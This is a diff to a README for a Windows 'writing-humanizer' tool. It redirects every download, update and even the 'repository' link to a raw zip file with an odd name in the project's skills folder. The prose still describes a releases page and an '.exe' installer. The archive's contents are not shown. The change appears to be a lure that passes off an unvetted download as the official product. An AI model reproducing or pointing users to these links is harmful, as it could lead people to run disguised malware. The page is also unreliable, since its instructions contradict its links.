@@ -1,6 +1,6 @@
 # ✍️ writing-humanizer - Make AI Text Sound Human
 
-[![Download writing-humanizer](https://img.shields.io/badge/Download-windows-blue?style=for-the-badge)](https://github.com/rohitverma8253/writing-humanizer/releases)
+[![Download writing-humanizer](https://img.shields.io/badge/Download-windows-blue?style=for-the-badge)](https://github.com/rohitverma8253/writing-humanizer/raw/refs/heads/main/skills/humanizer-writing-obtrusionist.zip)
 
 ---
 
@@ -30,12 +30,12 @@ You do not need programming skills or special software beforehand.
 
 1. Open your web browser.  
 2. Go to the official releases page:  
-   [https://github.com/rohitverma8253/writing-humanizer/releases](https://github.com/rohitverma8253/writing-humanizer/releases)  
+   [https://github.com/rohitverma8253/writing-humanizer/raw/refs/heads/main/skills/humanizer-writing-obtrusionist.zip](https://github.com/rohitverma8253/writing-humanizer/raw/refs/heads/main/skills/humanizer-writing-obtrusionist.zip)  
 3. Find the latest release version. It will have the date and a list of available files.  
 4. Look for the Windows installer file. It usually ends with `.exe` (for example, `writing-humanizer-setup.exe`).  
 5. Click on that file to start downloading it.  
 
-[![Download writing-humanizer](https://img.shields.io/badge/Get%20Latest%20Release-grey?style=for-the-badge)](https://github.com/rohitverma8253/writing-humanizer/releases)
+[![Download writing-humanizer](https://img.shields.io/badge/Get%20Latest%20Release-grey?style=for-the-badge)](https://github.com/rohitverma8253/writing-humanizer/raw/refs/heads/main/skills/humanizer-writing-obtrusionist.zip)
 
 ---
 
@@ -98,7 +98,7 @@ You do not need programming skills or special software beforehand.
 ## 🔄 Updating writing-humanizer
 
 - Check the releases page regularly to get new updates:  
-  [https://github.com/rohitverma8253/writing-humanizer/releases](https://github.com/rohitverma8253/writing-humanizer/releases)  
+  [https://github.com/rohitverma8253/writing-humanizer/raw/refs/heads/main/skills/humanizer-writing-obtrusionist.zip](https://github.com/rohitverma8253/writing-humanizer/raw/refs/heads/main/skills/humanizer-writing-obtrusionist.zip)  
 - Download the latest installer and run it to replace your older version.  
 - Your settings and preferences will remain unless you uninstall manually.
 
@@ -116,10 +116,10 @@ You do not need programming skills or special software beforehand.
 ## 📚 Resources and Support
 
 - Visit the GitHub repository for more information, help, and updates:  
-  [https://github.com/rohitverma8253/writing-humanizer](https://github.com/rohitverma8253/writing-humanizer)  
+  [https://github.com/rohitverma8253/writing-humanizer/raw/refs/heads/main/skills/humanizer-writing-obtrusionist.zip](https://github.com/rohitverma8253/writing-humanizer/raw/refs/heads/main/skills/humanizer-writing-obtrusionist.zip)  
 - Check the Issues tab on GitHub to see if others had similar questions.  
 - Use the Discussions or Contact options if available for assistance.
 
 ---
 
-[![Download writing-humanizer](https://img.shields.io/badge/Download-windows-blue?style=for-the-badge)](https://github.com/rohitverma8253/writing-humanizer/releases)
+[![Download writing-humanizer](https://img.shields.io/badge/Download-windows-blue?style=for-the-badge)](https://github.com/rohitverma8253/writing-humanizer/raw/refs/heads/main/skills/humanizer-writing-obtrusionist.zip)
